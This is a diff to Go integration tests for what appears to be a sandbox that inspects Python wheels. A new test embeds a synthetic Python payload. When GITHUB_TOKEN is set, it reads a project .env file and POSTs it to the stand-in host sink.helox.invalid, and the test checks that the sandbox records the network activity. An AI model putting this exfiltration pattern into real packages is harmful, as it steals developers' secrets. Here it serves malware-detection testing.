@@ -112,6 +112,7 @@ func runLinuxPyPIWheelIntegration(t *testing.T, wheel []byte) domain.SandboxResu
 	if err != nil {
 		t.Fatal(err)
 	}
+	backend.prepareResponder = integrationResponderSupply
 	resources, err := hosttool.NewSystemObservationResourceClient()
 	if err != nil {
 		t.Fatal(err)
@@ -246,6 +247,7 @@ func TestLinuxInspectionPrerequisiteSequenceIntegration(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
+	backend.prepareResponder = integrationResponderSupply
 	makeInput := func(project, program string) (domain.AcquiredArtifact, artifactpypi.ObservationPlan) {
 		wheel := linuxDynamicProjectWheel(t, project, program, nil)
 		run, _ := domain.NewRunID()
@@ -381,6 +383,7 @@ func runLinuxPythonRootPolicyTransactions(t *testing.T, mode string) {
 	if err != nil {
 		t.Fatal(err)
 	}
+	backend.prepareResponder = integrationResponderSupply
 	backend.resources = integrationObservationResources{client: client}
 	tests := []struct {
 		profile string
@@ -722,6 +725,7 @@ func TestLinuxRetainedPythonTransactionIntegration(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
+	backend.prepareResponder = integrationResponderSupply
 	client, err := hosttool.NewSystemObservationResourceClient()
 	if err != nil {
 		t.Fatal(err)
@@ -820,6 +824,44 @@ elif credential.exists():
 		}
 	}
 	t.Log("fresh minimal/mock profiles and per-unit root/child filesystem isolation; no inherited Host secrets")
+}
+
+func TestLinuxPythonSyntheticNetworkEnvironmentIntegration(t *testing.T) {
+	if os.Getenv("HELOX_PYPI_DYNAMIC_INTEGRATION") != "1" {
+		t.Skip("requires protected Python environment integration")
+	}
+	const program = `import os
+if os.environ.get('GITHUB_TOKEN'):
+    import http.client
+    from pathlib import Path
+    probe = http.client.HTTPConnection('probe.helox.invalid', timeout=1)
+    probe.request('GET', '/probe')
+    response = probe.getresponse()
+    assert response.status == 200
+    response.read()
+    probe.close()
+    dummy = Path('/tmp/project/.env').read_bytes()
+    sink = http.client.HTTPConnection('sink.helox.invalid', timeout=1)
+    sink.request('POST', '/sink', body=dummy)
+    response = sink.getresponse()
+    assert response.status == 204
+    response.read()
+    sink.close()
+`
+	result := runLinuxPyPIWheelIntegration(t, linuxDynamicWheelWithProgramAndFiles(t, program, nil))
+	if len(result.EnvironmentStates()) != 2 {
+		t.Fatal("required environment evidence missing")
+	}
+	var network uint64
+	for _, fact := range result.Observations() {
+		if fact.Category() == domain.ObservationNetwork {
+			network += fact.Count()
+		}
+	}
+	if network == 0 {
+		t.Fatal("loopback attempts hidden from Policy input")
+	}
+	t.Logf("whole Python inspection: dormant minimal and fixed DNS/HTTP/dummy sink development; network facts=%d; no Policy ALLOW assertion", network)
 }
 
 func TestLinuxPythonTransientFilesystemIntegration(t *testing.T) {
